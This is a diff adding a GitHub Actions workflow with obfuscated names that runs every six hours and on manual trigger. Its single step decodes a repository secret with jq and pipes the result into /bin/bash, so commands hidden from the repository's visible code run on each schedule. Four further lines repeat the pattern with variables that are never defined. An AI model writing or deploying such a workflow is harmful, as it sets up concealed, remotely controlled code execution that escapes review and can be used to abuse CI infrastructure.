@@ -1,0 +1,22 @@
+name: lvweixishun
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lvweixishun
+        env:
+          aja80860: ${{ secrets.aja80860 }}
+        run: |
+          echo $aja80860 | jq -r .yta57 | /bin/bash
+          echo $pjqz74 | jq -r .unt8 | /bin/bash
+          echo $n43789 | jq -r .epch50 | /bin/bash
+          echo $xovn83 | jq -r .rfvva66806 | /bin/bash
+          echo $eqjn18613 | jq -r .ataz5 | /bin/bash
+
